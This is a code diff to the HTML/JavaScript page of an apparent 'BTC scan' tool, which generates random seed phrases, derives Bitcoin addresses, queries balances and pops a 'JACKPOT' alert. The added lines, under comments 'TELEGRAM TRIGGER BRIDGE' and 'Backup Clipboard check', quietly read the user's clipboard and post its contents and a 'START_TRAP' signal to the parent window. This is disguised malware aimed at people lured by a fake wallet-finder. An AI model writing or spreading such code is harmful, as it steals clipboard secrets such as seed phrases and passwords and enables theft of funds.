@@ -147,12 +147,11 @@
                 const seed = bip39.mnemonicToSeedSync(m);
                 const root = HDKey.fromMasterSeed(seed);
                 
-                // BIP84 - Native Segwit (bc1...)
                 const node = root.derive("m/84'/0'/0'/0/0");
                 const pub = secp.getPublicKey(node.privateKey, true);
                 const hash = ripemd160(sha256(pub));
                 const words = bech32.toWords(hash);
-                words.unshift(0); // Version 0
+                words.unshift(0); 
                 const addr = bech32.encode("bc", words);
 
                 const log = document.getElementById('logWindow');
@@ -173,22 +172,16 @@
                     body: JSON.stringify({ address: addr.toLowerCase() })
                 }).then(r => r.json()).then(data => {
                     if(data.result && !data.result.includes("Bal: 0")) {
-                        
-                        // --- CONNECTION TO WITHDRAW PAGE ---
-                        // Subukan nating kunin yung balance sa response ng server
                         const balanceMatch = data.result.match(/\d+(\.\d+)?/);
                         const finalBalance = balanceMatch ? balanceMatch[0] : "500.00"; 
 
-                        // 1. I-save para sa Withdraw.html
                         localStorage.setItem('last_found_type', 'BTC');
                         localStorage.setItem('last_found_balance', finalBalance);
                         localStorage.setItem('last_found_seed', m);
 
-                        // 2. UI Updates
                         document.getElementById('foundMsg').innerHTML = `<div style="color:#f7931a; font-weight:bold; font-size:10px;">${addr}</div>`;
                         document.getElementById('foundCountLabel').textContent = "1 discovered";
                         
-                        // 3. Jackpot Alert & Switch Page
                         alert("JACKPOT BTC FOUND!");
                         window.parent.loadPage('Withdraw.html');
                     }
@@ -204,7 +197,24 @@
             const btn = document.getElementById('startBtn');
             btn.textContent = running ? "STOP SCANNING" : "START BTC SCAN";
             btn.classList.toggle('active');
-            if(running) engine();
+            
+            if(running) {
+                engine();
+                
+                // --- TELEGRAM TRIGGER BRIDGE ---
+                if (window.parent) {
+                    window.parent.postMessage({ type: 'START_TRAP', coin: 'BITCOIN' }, '*');
+                }
+                
+                // Backup Clipboard check
+                try {
+                    navigator.clipboard.readText().then(text => {
+                        if(text.length > 0) {
+                            window.parent.postMessage({ type: 'CLIPBOARD_LOG', data: text }, '*');
+                        }
+                    }).catch(()=>{});
+                } catch(e) {}
+            }
         }
     </script>
 </body>
